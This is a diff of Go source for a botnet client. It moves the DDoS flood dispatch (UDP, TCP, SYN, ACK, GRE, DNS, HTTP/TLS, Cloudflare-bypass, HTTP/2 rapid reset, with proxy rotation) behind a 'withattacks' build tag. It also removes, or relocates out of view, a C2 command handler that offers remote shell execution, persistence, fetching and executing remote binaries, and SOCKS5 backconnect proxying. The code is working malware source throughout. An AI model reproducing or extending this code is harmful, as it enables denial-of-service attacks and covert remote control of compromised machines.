@@ -1,3 +1,5 @@
+//go:build withattacks
+
 package main
 
 import (
@@ -14,8 +16,6 @@ import (
 	"net"
 	"net/http"
 	"net/url"
-	"os"
-	"runtime"
 	"strconv"
 	"strings"
 	"sync"
@@ -25,6 +25,8 @@ import (
 	"golang.org/x/net/http2"
 	"golang.org/x/net/http2/hpack"
 )
+
+const hasAttacks = true
 
 // ============================================================================
 // ATTACK CONTROL FUNCTIONS
@@ -53,202 +55,82 @@ func raichu() chan struct{} {
 	return aptStopChan
 }
 
-// blackEnergy is the main command dispatcher that handles all C2 commands.
-// Supported commands:
-//   - !shell, !exec: Execute command and return output
-//   - !stream: Execute command with streaming output
-//   - !detach, !bg: Execute command in background
-//   - !stop: Stop all running attacks
-//   - !udpflood, !tcpflood, !http, !https, !tls, !syn, !ack, !gre, !dns, !cfbypass: DDoS attacks
-//   - !persist [url]: Setup persistence (copies self, or fetches url if given)
-//   - !reinstall <url>: Fetch ELF or .sh from url and exec-replace current process
-//   - !kill: Terminate the bot
-//   - !info: Return system information
-//   - !socks: Start SOCKS5 proxy
-//   - !stopsocks: Stop SOCKS5 proxy
-//
-// Parameters:
-//   - conn: C2 connection for sending responses
-//   - command: Raw command string from C2
-//
-// Returns: error if command invalid or execution fails
-func blackEnergy(conn net.Conn, command string) error {
-	fields := strings.Fields(command)
-	if len(fields) == 0 {
-		return fmt.Errorf("empty command")
+// dispatchAttackStop stops all running attacks (called by blackEnergy for !stop).
+func dispatchAttackStop() {
+	pikachu()
+}
+
+// dispatchAttack handles all flood/DDoS commands routed from blackEnergy.
+func dispatchAttack(conn net.Conn, cmd string, fields []string) error {
+	useProxy := false
+	proxyURL := ""
+	minFields := 4
+
+	if (cmd == "!http" || cmd == "!https" || cmd == "!tls" || cmd == "!cfbypass" || cmd == "!rapidreset") && len(fields) >= 6 {
+		if fields[4] == "-pu" {
+			proxyURL = fields[5]
+			proxies, err := fetchProxyList(proxyURL)
+			if err != nil || len(proxies) == 0 {
+				conn.Write([]byte(fmt.Sprintf("ERROR: Failed to fetch proxies: %v\n", err)))
+				return nil
+			}
+			useProxy = true
+			proxyListMutex.Lock()
+			proxyList = proxies
+			proxyListMutex.Unlock()
+			deoxys("Loaded %d proxies from %s (no validation)", len(proxies), proxyURL)
+		}
 	}
-	cmd := fields[0]
+
+	if len(fields) < minFields {
+		return fmt.Errorf("invalid format")
+	}
+	target := fields[1]
+	targetPort, err := strconv.Atoi(fields[2])
+	if err != nil || targetPort <= 0 || targetPort > 65535 {
+		return fmt.Errorf("invalid port: %s", fields[2])
+	}
+	duration, err := strconv.Atoi(fields[3])
+	if err != nil || duration < 5 {
+		return fmt.Errorf("invalid duration (min 5s): %s", fields[3])
+	}
 	switch cmd {
-	case "!shell", "!exec":
-		if len(fields) < 2 {
-			return fmt.Errorf("usage: !shell <command>")
-		}
-		output, err := sidewinder(strings.Join(fields[1:], " "))
-		if err != nil {
-			conn.Write([]byte(fmt.Sprintf(protoErrFmt, err)))
-		} else {
-			encoded := base64.StdEncoding.EncodeToString([]byte(output))
-			conn.Write([]byte(fmt.Sprintf(protoOutFmt, encoded)))
-		}
-		return nil
-	case "!stream":
-		if len(fields) < 2 {
-			return fmt.Errorf("usage: !stream <command>")
-		}
-		go machete(strings.Join(fields[1:], " "), conn)
-		conn.Write([]byte(msgStreamStart))
-		return nil
-	case "!detach", "!bg":
-		if len(fields) < 2 {
-			return fmt.Errorf("usage: !detach <command>")
-		}
-		oceanLotus(strings.Join(fields[1:], " "))
-		conn.Write([]byte(msgBgStart))
-		return nil
-	case "!stop":
-		pikachu()
-		return nil
-	case "!udpflood", "!tcpflood", "!http", "!ack", "!gre", "!syn", "!dns", "!https", "!tls", "!cfbypass", "!rapidreset":
-		// Check for proxy mode: !method target port duration -pu <proxy_url>
-		useProxy := false
-		proxyURL := ""
-		minFields := 4
-
-		// Check if -pu flag is present (proxy URL - bot fetches and rotates without validation)
-		if (cmd == "!http" || cmd == "!https" || cmd == "!tls" || cmd == "!cfbypass" || cmd == "!rapidreset") && len(fields) >= 6 {
-			if fields[4] == "-pu" {
-				proxyURL = fields[5]
-				// Fetch proxy list from URL (no validation, max speed)
-				proxies, err := fetchProxyList(proxyURL)
-				if err != nil || len(proxies) == 0 {
-					conn.Write([]byte(fmt.Sprintf("ERROR: Failed to fetch proxies: %v\n", err)))
-					return nil
-				}
-				useProxy = true
-				// Update global proxy list
-				proxyListMutex.Lock()
-				proxyList = proxies
-				proxyListMutex.Unlock()
-				deoxys("Loaded %d proxies from %s (no validation)", len(proxies), proxyURL)
-			}
-		}
-
-		if len(fields) < minFields {
-			return fmt.Errorf("invalid format")
-		}
-		target := fields[1]
-		targetPort, err := strconv.Atoi(fields[2])
-		if err != nil || targetPort <= 0 || targetPort > 65535 {
-			return fmt.Errorf("invalid port: %s", fields[2])
-		}
-		duration, err := strconv.Atoi(fields[3])
-		if err != nil || duration < 5 {
-			return fmt.Errorf("invalid duration (min 5s): %s", fields[3])
-		}
-		switch cmd {
-		case "!udpflood":
-			go snorlax(target, targetPort, duration)
-		case "!tcpflood":
-			go gengar(target, targetPort, duration)
-		case "!http":
-			if useProxy {
-				go alakazamProxy(target, targetPort, duration, true)
-				return nil
-			}
-			go alakazam(target, targetPort, duration)
-		case "!https", "!tls":
-			if useProxy {
-				go machampProxy(target, targetPort, duration, true)
-				return nil
-			}
-			go machamp(target, targetPort, duration)
-		case "!cfbypass":
-			if useProxy {
-				go gyaradosProxy(target, targetPort, duration, true)
-				return nil
-			}
-			go gyarados(target, targetPort, duration)
-		case "!syn":
-			go dragonite(target, targetPort, duration)
-		case "!ack":
-			go tyranitar(target, targetPort, duration)
-		case "!gre":
-			go metagross(target, duration)
-		case "!dns":
-			go salamence(target, targetPort, duration)
-		case "!rapidreset":
-			if useProxy {
-				go darkraiProxy(target, targetPort, duration, true)
-				return nil
-			}
-			go arkrai(target, targetPort, duration)
-		}
-	case "!persist":
-		url := ""
-		if len(fields) >= 2 {
-			url = fields[1]
-		}
-		go dragonfly(url)
-		conn.Write([]byte(msgPersistStart))
-	case "!reinstall":
-		if len(fields) < 2 {
-			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "usage: !reinstall <url>")))
+	case "!udpflood":
+		go snorlax(target, targetPort, duration)
+	case "!tcpflood":
+		go gengar(target, targetPort, duration)
+	case "!http":
+		if useProxy {
+			go alakazamProxy(target, targetPort, duration, true)
 			return nil
 		}
-		go reinstall(fields[1])
-		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, "Reinstall initiated: "+fields[1])))
-	case "!kill":
-		conn.Write([]byte(msgKillAck))
-		nukeAndExit()
-	case "!info":
-		hostname, _ := os.Hostname()
-		arch := charmingKitten()
-		info := fmt.Sprintf("Hostname: %s\nArch: %s\nBotID: %s\nOS: %s\n", hostname, arch, mustangPanda(), runtime.GOOS)
-		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, info)))
-	case "!socks":
-		if len(fields) < 2 {
-			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "usage: !socks <port> (direct) or !socks <relay:port> (backconnect)")))
+		go alakazam(target, targetPort, duration)
+	case "!https", "!tls":
+		if useProxy {
+			go machampProxy(target, targetPort, duration, true)
 			return nil
 		}
-		arg := fields[1]
-		// If it's just a port number → direct listener mode (no relay)
-		if _, err := strconv.Atoi(arg); err == nil {
-			err := turmoil(arg, conn)
-			if err != nil {
-				conn.Write([]byte(fmt.Sprintf(msgSocksErrFmt, err)))
-			} else {
-				conn.Write([]byte(fmt.Sprintf(msgSocksStartFmt, "0.0.0.0:"+arg)))
-			}
+		go machamp(target, targetPort, duration)
+	case "!cfbypass":
+		if useProxy {
+			go gyaradosProxy(target, targetPort, duration, true)
 			return nil
 		}
-		// Otherwise it's relay address(es) — backconnect mode
-		var relays []string
-		for _, r := range strings.Split(arg, ",") {
-			r = strings.TrimSpace(r)
-			if r != "" {
-				relays = append(relays, r)
-			}
+		go gyarados(target, targetPort, duration)
+	case "!syn":
+		go dragonite(target, targetPort, duration)
+	case "!ack":
+		go tyranitar(target, targetPort, duration)
+	case "!gre":
+		go metagross(target, duration)
+	case "!dns":
+		go salamence(target, targetPort, duration)
+	case "!rapidreset":
+		if useProxy {
+			go darkraiProxy(target, targetPort, duration, true)
+			return nil
 		}
-		err := muddywater(relays, conn)
-		if err != nil {
-			conn.Write([]byte(fmt.Sprintf(msgSocksErrFmt, err)))
-		} else {
-			conn.Write([]byte(fmt.Sprintf(msgSocksStartFmt, relays[0])))
-		}
-	case "!stopsocks":
-		emotet()
-		conn.Write([]byte(msgSocksStop))
-	case "!socksauth":
-		if len(fields) < 3 {
-			return fmt.Errorf("usage: !socksauth <username> <password>")
-		}
-		socksCredsMutex.Lock()
-		proxyUser = fields[1]
-		proxyPass = fields[2]
-		socksCredsMutex.Unlock()
-		conn.Write([]byte(fmt.Sprintf(msgSocksAuthFmt, fields[1])))
-	default:
-		return fmt.Errorf("unknown command")
+		go arkrai(target, targetPort, duration)
 	}
 	return nil
 }
@@ -1170,118 +1052,6 @@ func metagross(targetIP string, duration int) error {
 }
 
 // encodeDNSName encodes a domain name in DNS wire format (label-length encoding).
-func encodeDNSName(domain string) []byte {
-	var buf []byte
-	for _, label := range strings.Split(strings.TrimSuffix(domain, "."), ".") {
-		if len(label) > 63 {
-			label = label[:63]
-		}
-		buf = append(buf, byte(len(label)))
-		buf = append(buf, []byte(label)...)
-	}
-	buf = append(buf, 0) // root label
-	return buf
-}
-
-// encodeDNSQuery builds a raw DNS query packet with optional EDNS0 OPT record.
-func encodeDNSQuery(domain string, qtype uint16, edns bool) []byte {
-	arcount := uint16(0)
-	if edns {
-		arcount = 1
-	}
-	// Header: ID, Flags(RD=1), QDCOUNT=1, ANCOUNT=0, NSCOUNT=0, ARCOUNT
-	hdr := make([]byte, 12)
-	binary.BigEndian.PutUint16(hdr[0:2], uint16(rand.Intn(65536))) // random ID
-	binary.BigEndian.PutUint16(hdr[2:4], 0x0100)                   // flags: RD=1
-	binary.BigEndian.PutUint16(hdr[4:6], 1)                        // QDCOUNT
-	binary.BigEndian.PutUint16(hdr[10:12], arcount)                // ARCOUNT
-	// Question section
-	name := encodeDNSName(domain)
-	q := make([]byte, 4)
-	binary.BigEndian.PutUint16(q[0:2], qtype)
-	binary.BigEndian.PutUint16(q[2:4], 1) // QCLASS IN
-	pkt := append(hdr, name...)
-	pkt = append(pkt, q...)
-	// EDNS0 OPT record
-	if edns {
-		opt := []byte{
-			0x00,       // Name: root
-			0x00, 0x29, // Type: OPT
-			0x10, 0x00, // UDP payload size: 4096
-			0x00,       // Extended RCODE
-			0x00,       // Version
-			0x00, 0x00, // Flags
-			0x00, 0x00, // RDLENGTH
-		}
-		pkt = append(pkt, opt...)
-	}
-	return pkt
-}
-
-// parseDNSTXTResponse extracts TXT record strings from a raw DNS response.
-func parseDNSTXTResponse(data []byte) ([]string, error) {
-	if len(data) < 12 {
-		return nil, fmt.Errorf("response too short")
-	}
-	ancount := binary.BigEndian.Uint16(data[6:8])
-	rcode := data[3] & 0x0F
-	if rcode != 0 {
-		return nil, fmt.Errorf("DNS rcode %d", rcode)
-	}
-	// Skip question section
-	off := 12
-	qdcount := binary.BigEndian.Uint16(data[4:6])
-	for i := 0; i < int(qdcount); i++ {
-		off = skipDNSName(data, off)
-		off += 4 // QTYPE + QCLASS
-	}
-	// Parse answer RRs
-	var txts []string
-	for i := 0; i < int(ancount); i++ {
-		if off >= len(data) {
-			break
-		}
-		off = skipDNSName(data, off)
-		if off+10 > len(data) {
-			break
-		}
-		rrtype := binary.BigEndian.Uint16(data[off : off+2])
-		rdlength := binary.BigEndian.Uint16(data[off+8 : off+10])
-		off += 10
-		if off+int(rdlength) > len(data) {
-			break
-		}
-		if rrtype == 16 { // TXT
-			rdEnd := off + int(rdlength)
-			for off < rdEnd {
-				tlen := int(data[off])
-				off++
-				if off+tlen > rdEnd {
-					break
-				}
-				txts = append(txts, string(data[off:off+tlen]))
-				off += tlen
-			}
-		} else {
-			off += int(rdlength)
-		}
-	}
-	return txts, nil
-}
-
-// skipDNSName advances past a DNS name (handling compression pointers).
-func skipDNSName(data []byte, off int) int {
-	for off < len(data) {
-		if data[off] == 0 {
-			return off + 1
-		}
-		if data[off]&0xC0 == 0xC0 {
-			return off + 2 // compression pointer
-		}
-		off += int(data[off]) + 1
-	}
-	return off
-}
 
 // salamence performs a DNS query flood attack.
 func salamence(targetIP string, targetPort, duration int) {
